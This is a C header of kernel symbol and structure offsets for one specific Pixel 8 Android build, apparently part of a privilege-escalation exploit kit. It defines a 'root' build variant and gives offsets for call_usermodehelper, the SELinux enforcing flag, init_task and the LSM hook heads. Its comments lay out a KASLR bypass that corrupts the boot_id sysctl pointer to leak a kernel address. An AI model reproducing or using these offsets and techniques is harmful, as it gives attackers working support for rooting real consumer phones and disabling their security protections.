// shiba — Pixel 8, Android 17
// Build:     CP2A.260705.006
// Kernel:    6.1.157-android14-11-gbd23337e42e7-ab14791245
// Interface: android14-6.1
//
// What this build does not share with its kernel interface. Everything else
// is supplied by the interface header included at the end.

#ifndef OFFSET_H
#define OFFSET_H

#if defined(APP_PAYLOAD) && APP_PAYLOAD
#define BUILD_VARIANT_LABEL "shiba-CP2A.260705.006-app"
#else
#define BUILD_VARIANT_LABEL "shiba-CP2A.260705.006-root-umh"
#endif
#ifndef BUILD_FINGERPRINT
#define BUILD_FINGERPRINT "google/shiba/shiba:17/CP2A.260705.006/15641320:user/release-keys"
#endif

// ── Kernel release ──
// Encoded as (major<<16)|(minor<<8)|min(patch,255) so a stage can refuse at
// build time a vehicle whose structure only exists from a given release,
// instead of discovering it on the device.
#define KERNEL_VERSION_CODE 0x06019d  // 6.1.157

// ── Symbol offsets from the image base ──
#define ASHMEM_IOCTL_OFF            0x00c38d28ULL
#define ASHMEM_MMAP_OFF             0x00c396b8ULL
#define ASHMEM_OPEN_OFF             0x00c398d8ULL
#define ASHMEM_RELEASE_OFF          0x00c39960ULL
#define ASHMEM_SHOW_FDINFO_OFF      0x00c39a80ULL
// &ashmem_miscs[0].fops = ashmem_miscs + offsetof(miscdevice, fops=0x10)
#define ASHMEM_MISC_FOPS_OFF        0x0217cb80ULL
#define ASHMEM_FOPS_OFF             0x01280b50ULL
#define ASHMEM_COMPAT_IOCTL_OFF     0x00c39660ULL

#define CONFIGFS_READ_ITER_OFF      0x00464400ULL
#define CONFIGFS_BIN_WRITE_ITER_OFF 0x00464930ULL
// 6.1 has no copy_splice_read: configfs uses generic_file_splice_read
#define COPY_SPLICE_READ_OFF        0x003e5fd4ULL
#define NOOP_LLSEEK_OFF             0x003986dcULL
#define INIT_TASK_OFF               0x0201f640ULL
#define ROOT_TASK_GROUP_OFF         0x02208580ULL
// runtime selinux_enforcing = selinux_state.enforcing = selinux_state + 0
#define SELINUX_ENFORCING_OFF       0x0225a420ULL
#define SELINUX_BLOB_SIZES_OFF      0x015ceb88ULL
#define SECURITY_HOOK_HEADS_OFF     0x015ce478ULL
#define KMALLOC_CACHES_OFF          0x015cdfb8ULL
#define ANON_PIPE_BUF_OPS_OFF       0x01109910ULL
#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x000d36f4ULL
#define SYSTEM_UNBOUND_WQ_OFF       0x0200ae60ULL

// ── Slide references ──
// Symbols a text-base recovery reads or reaches through.
// nfulnl_logger struct (registered via nf_log_register(NFPROTO_UNSPEC,...)).
#define SLIDE_NFULNL_LOGGER_OFF     0x020129d0
// Write-free KASLR (cves/lib/kaslr/README.md): tracing_mark_write _THIS_IP_

#define SLIDE_TRACE_MARK_IP_OFF     0x001f0ac8ULL
// loggers[0][NF_LOG_TYPE_ULOG=1] = loggers + 8  (holds &nfulnl_logger)
#define SLIDE_LOGGERS_0_1_OFF       0x02012920ULL
// 6.1 serves /proc/sys/kernel/random/boot_id from sysctl_bootid[16]
// (drivers/char/random.c: ctl_table .data = &sysctl_bootid). No separate
// random_boot_id exists on 6.1.
//
// The slide write must corrupt random_table[4].data (the .data pointer of
// the boot_id ctl_table entry), NOT sysctl_bootid itself. proc_do_uuid()
// then treats the corrupted pointer as the buffer address and reads 16
// bytes from there (the contents of loggers[0][1] = &nfulnl_logger).
// random_table @ 0x2137c00; entry idx4 (boot_id) * 0x40 + data@0x8 = 0x2137d08.
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x02137d08ULL
// sysctl_bootid buffer itself (restore_slide_boot_id writes &sysctl_bootid
// back into random_table[4].data via SLIDE_SYSCTL_BOOTID).
#define SLIDE_SYSCTL_BOOTID_OFF     0x0227b498ULL
// 6.1 slide uses loggers[0][1] (= SLIDE_LOGGERS_0_1) as the rb parent
// whose content is leaked.
#define SLIDE_LOGGER_PARENT SLIDE_LOGGERS_0_1

#define MM_OWNER_OFF                  0x338

#define WAITER_LOCAL_OFF              0x80
#define WAITER_TREE_ENTRY_OFF         0x00
#define WAITER_PI_TREE_ENTRY_OFF      0x18
#define WAITER_TASK_OFF               0x30
#define WAITER_LOCK_OFF               0x38
#define WAITER_WAKE_STATE_OFF         0x40
#define WAITER_PRIO_OFF               0x44
#define WAITER_DEADLINE_OFF           0x48
#define WAITER_WW_CTX_OFF             0x50
#define FOPS_POST_LLSEEK_OFF    0x10

#include "../kmi/android14-6.1.h"

#endif
